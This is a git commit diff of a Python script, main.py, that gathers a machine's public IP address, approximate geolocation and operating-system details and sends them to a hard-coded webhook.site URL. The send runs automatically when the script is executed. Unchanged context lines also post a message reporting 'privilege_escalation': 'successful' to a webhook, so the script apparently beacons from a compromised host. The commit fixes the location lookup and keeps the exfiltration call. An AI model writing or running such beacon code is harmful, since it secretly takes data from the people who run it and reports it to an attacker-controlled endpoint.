ffb1f792a54f393dd8603968fc7baceae49c76de
TOTOSOLEIL3 <66794099+TOTOSOLEIL3@users.noreply.github.com>
2023-02-27 23:03:36 +0100

    Update main.py

--- main.py
+++ main.py
@@ -2,21 +2,13 @@ import requests
 import socket
 import platform
 import json
-import geocoder
-import os
+from geopy.geocoders import Nominatim
 
 def get_location():
-    webhook_url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
-    g = geocoder.ip('me')
-    latitude, longitude = g.latlng
-    data = {
-        'latitude': latitude,
-        'longitude': longitude
-    }
-    response = requests.post(webhook_url, json=data)
-    print(response.text)
-
-send_location_to_webhook()
+    geolocator = Nominatim(user_agent="location_sender")
+    ip = requests.get("https://api.ipify.org").text
+    location = geolocator.geocode(ip, language="en")
+    return location.latitude, location.longitude
 
 def get_system_info():
     info = {}
@@ -25,22 +17,6 @@ def get_system_info():
     info['os_release'] = platform.release()
     info['architecture'] = platform.machine()
     return info
-
-def send_data():
-    location = get_location()
-    info = get_system_info()
-    data = {
-        "latitude": location[0],
-        "longitude": location[1],
-        "system_info": info
-    }
-    headers = {'Content-type': 'application/json'}
-    url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
-    response = requests.post(url, data=json.dumps(data), headers=headers)
-    print(response.content)
-
-send_data()
-
 
 ip_address = requests.get('https://api.ipify.org').text
 
@@ -56,3 +32,18 @@ data = {'ip_address': ip_address, 'privilege_escalation': 'successful'}
 response = requests.post(webhook_url, json=data)
 print('Data sent to webhook:', response.text)
 
+
+def send_data():
+    location = get_location()
+    info = get_system_info()
+    data = {
+        "latitude": location[0],
+        "longitude": location[1],
+        "system_info": info
+    }
+    headers = {'Content-type': 'application/json'}
+    url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
+    response = requests.post(url, data=json.dumps(data), headers=headers)
+    print(response.content)
+
+send_data()
